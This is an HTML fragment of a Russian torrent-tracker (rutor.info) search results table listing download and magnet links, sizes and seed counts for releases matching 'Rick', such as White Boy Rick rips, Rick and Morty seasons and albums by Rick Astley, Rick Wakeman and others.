+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>04&nbsp;Апр&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/686802"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cbdfb0ecb27f88a8c6eee2e26b54244472a38c90&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686802/belyj-paren-rik_white-boy-rick-2018-bdrip-1080p-ot-ollandgroup-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip 1080p от OlLanDGroup | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">9.84&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>04&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/691772"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ca0f67a77156f62813fcea8893df6884b1e24ed3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691772/belyj-paren-rik_white-boy-rick-2018-blu-ray-eur-1080p-licenzija">Белый парень Рик / White Boy Rick (2018) Blu-Ray EUR 1080p | Лицензия </a></td>
+<td align="right">32.19&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>04&nbsp;Апр&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/691767"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ed179d33fceb1269af4e35532d36d684bcd35a75&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/691767/belyj-paren-rik_white-boy-rick-2018-bdrip-licenzija">Белый парень Рик / White Boy Rick (2018) BDRip | Лицензия </a></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>22&nbsp;Мар&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/689469"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:278c3e455686ccce6b7104bd6cb482f2cd9643c8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/689469/ost-zakativ-glaza_white-of-the-eye-nick-mason-rick-fenn-1987-flac">OST - Закатив глаза / White Of The Eye [Nick Mason &amp; Rick Fenn] (1987) FLAC </a></td>
+<td align="right">474.87&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>10&nbsp;Мар&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/686848"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d506e6bf769b9998cef59ecb96ec5cf886055498&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686848/belyj-paren-rik_white-boy-rick-2018-bdrip-ot-megapeer-hdrezka-studio">Белый парень Рик / White Boy Rick (2018) BDRip от MegaPeer | HDRezka Studio </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>10&nbsp;Мар&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/686809"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1164fe9523d0531be4f208bf5c50ec394a8217cc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686809/belyj-paren-rik_white-boy-rick-2018-bdrip-hdrezka-studio">Белый парень Рик / White Boy Rick (2018) BDRip | HDRezka Studio </a></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>10&nbsp;Мар&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/686744"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:eecec01a555363e78bd6319a45b3c6f9fbbc4ebb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/686744/belyj-paren-rik_white-boy-rick-2018-hdrip-ot-exkinoray-hdrezka-studio">Белый парень Рик / White Boy Rick (2018) HDRip от ExKinoRay | HDRezka Studio </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.38&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>04&nbsp;Мар&nbsp;19</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/685489"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:18fb095cce9a6dd1411535c3895d669c068d8ef2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/685489/rick-wakeman-piano-odyssey-2018-mp3">Rick Wakeman - Piano Odyssey (2018) MP3 </a></td>
+<td align="right">126.50&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>16&nbsp;Янв&nbsp;19</td><td ><a class="downgif" href="http://d.rutor.info/download/675915"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bb01c46fcbf89a1e593b64d7222c4b521423f797&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/675915/belyj-paren-rik_white-boy-rick-2018-hdrip-ot-exkinoray-ukr-sub">Белый парень Рик / White Boy Rick (2018) HDRip от ExKinoRay | UKR, Sub </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>16&nbsp;Ноя&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/665208"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:83747874364ddc222401e06c54d5d234aab217f3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/665208/rick-derringer-tend-the-fire-1996-mp3">Rick Derringer - Tend The Fire (1996) MP3 </a></td>
+<td align="right">118.03&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>16&nbsp;Ноя&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/665203"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:da47553654e49ca2f999913c84eaee81c1bcd83a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/665203/rick-derringer-the-three-kings-of-the-blues-2010-mp3">Rick Derringer - The Three Kings Of The Blues (2010) MP3 </a></td>
+<td align="right">118.08&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>08&nbsp;Сен&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/652002"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e01c65c1c98b0e80c0cdb7adb698d5816bcdd4e2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/652002/rick-springfield-wait-for-night-1976-mp3">Rick Springfield - Wait For Night (1976) MP3 </a></td>
+<td align="right">73.83&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>08&nbsp;Сен&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/651999"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:30ec4eb6d1d1c15865df46bf74a1a59937a845fb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/651999/rick-springfield-mission-magic-1974-mp3">Rick Springfield - Mission Magic (1974) MP3 </a></td>
+<td align="right">93.84&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>26&nbsp;Июл&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/592837"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7126eb1f8d7d5ec072bce435e41f95a565818046&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/592837/rick-james-wonderful-1987-mp3">Rick  James - Wonderful (1987) MP3 </a></td>
+<td align="right">119.18&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>24&nbsp;Июл&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/643553"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fb0af45ffc25d63cf9acf1bc962d0e80c8d20f49&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/643553/rick-astley-beautiful-life-2018-flac">Rick Astley - Beautiful Life (2018) FLAC </a></td>
+<td align="right">287.64&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>13&nbsp;Июл&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/641785"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5f173307e7549facfb90d3833046e1eb67a97daf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/641785/rick-astley-beautiful-life-2018-mp3">Rick Astley - Beautiful Life (2018) MP3 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">99.61&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>02&nbsp;Июн&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/634594"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b76995c9308d5e7f75e1073fc0b6cdfda114aa4d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/634594/rik-i-morti_rick-and-morty-s02-2015-bdremux-1080p-syenduk">Рик и Морти / Rick and Morty [S02] (2015) BDRemux 1080p | Сыендук </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">32.52&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>29&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/633988"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7c120a6dc1124d9dc6ca7d05f2b8a75edf70eca8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/633988/rik-i-morti_rick-and-morty-s03-2017-bdremux-1080p-syenduk">Рик и Морти / Rick and Morty [S03] (2017) BDRemux 1080p | Сыендук </a></td>
+<td align="right">18.10&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;19</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>26&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/633345"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:318319e9b5402063ef1217ad3daa8dfe4f863c61&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/633345/rik-i-morti_rick-and-morty-s03-2017-web-dlrip-hevc-1080p-syenduk">Рик и Морти / Rick and Morty [S03] (2017) WEB-DLRip-HEVC 1080p | Сыендук </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.89&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;13</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>22&nbsp;Мар&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/621135"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:188f47ec48599ce2b92452da09e479f1825204bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/621135/rick-springfield-the-snake-king-2018-mp3-ot-vanila">Rick Springfield - The Snake King (2018) MP3 от Vanila </a></td>
+<td align="right">135.25&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>22&nbsp;Мар&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/621090"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e5600986ab8e03228c980d62c5916f526abe07f1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/621090/rick-parfitt-status-quo-over-and-out-2018-mp3">Rick Parfitt (Status Quo) - Over and Out (2018) MP3 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">82.43&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>22&nbsp;Ноя&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/582236"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d58c2e7bd3aeb66150fe73f76d2341e1b69b925f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/582236/rik-i-morti_rick-and-morty-s03-2017-web-dl-1080p-syenduk">Рик и Морти / Rick and Morty [S03] (2017) WEB-DL 1080p | Сыендук </a></td> <td align="right">27<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">5.34&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;32</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>29&nbsp;Окт&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/593985"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e23764072a92ed38ed29ae858231ab30b8949f22&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/593985/rik-i-morti_rick-and-morty-s01-03-2013-2017-bdrip-hevc-720p-webrip-hevc-720p-syenduk">Рик и Морти / Rick and Morty [S01-03] (2013-2017) BDRip-HEVC 720p, WEBRip-HEVC 720p | Сыендук </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">4.64&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;50</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;35</span></td></tr><tr class="tum"><td>04&nbsp;Окт&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/562405"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:889db19dbfbf428a9c5a8044a6decccc7ec71c51&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/562405/rik-i-morti_rick-and-morty-s03-2017-webrip-720p-ideafilm">Рик и Морти / Rick and Morty [S03] (2017) WEBRip 720p | IdeaFilm </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.97&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>04&nbsp;Окт&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/579379"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f184e4d2ac60158490fd12e4e46be49bf5d87936&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/579379/rik-i-morti_rick-and-morty-s03-2017-webrip-1080p-ideafilm">Рик и Морти / Rick and Morty [S03] (2017) WEBRip 1080p | IdeaFilm </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">13.43&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>02&nbsp;Окт&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/589402"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:47186db8869cf71787e6c45185cefa9cf77b95a4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/589402/rik-i-morti_rick-and-morty-s03-2017-hdtvrip-720p-sunshine-studio">Рик и Морти / Rick and Morty [S03] (2017) HDTVRip 720p | Sunshine Studio </a></td>
+<td align="right">3.53&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>16&nbsp;Сен&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/586779"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b303eed0767b4b18cacbfc2b0c39a81768d9b875&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/586779/tipichnyj-rik_typical-rick-s01-2016-web-dl-1080p-newstation">Типичный Рик / Typical Rick [S01] (2016) WEB-DL 1080p | NewStation </a></td>
+<td align="right">1.24&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>17&nbsp;Мар&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/556487"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c6852ab06aa7fd191353158977fc21e92b072c43&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/556487/rick-ross-rather-you-than-me-2017-flac">Rick Ross - Rather You Than Me (2017) FLAC </a></td>
+<td align="right">429.16&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>25&nbsp;Янв&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/546867"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5c7742d560b5ee213f4c7a178eb34df03bf350e1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/546867/rick-wakeman-piano-portraits-2017-mp3">Rick Wakeman - Piano Portraits (2017) MP3 </a></td>
+<td align="right">142.79&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>24&nbsp;Янв&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/546749"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9606c0f8eaefecff93048fb51fb55af16338143a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/546749/rick-wakeman-piano-portraits-2017-aac-ot-bestsound-exkinoray-itunes">Rick Wakeman - Piano Portraits (2017) AAC от BestSound ExKinoRay | iTunes </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">120.26&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>09&nbsp;Янв&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/518699"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8aca34b326062df7c9a6ddf1b1ff039921313307&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/518699/rik-i-morti_rick-and-morty-s01-02-2013-2015-hdrip-syenduk">Рик и Морти / Rick and Morty [S01-02] (2013-2015) HDRip  | Сыендук </a></td> <td align="right">10<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">9.08&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;20</span></td></tr><tr class="tum"><td>17&nbsp;Окт&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/529243"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9c0370357c7b699cc01e97b1eae24a1a0164e5c5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/529243/rick-astley-discography-1987-2016-aac">Rick Astley - Discography (1987-2016) AAC </a></td>
+<td align="right">2.57&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>10&nbsp;Авг&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/518284"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d6d885af7faea74cfae2658e992666be2770fa75&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/518284/rick-gibson-band-junkyard-son-2016-mp3">Rick Gibson Band - Junkyard Son (2016) MP3 </a></td>
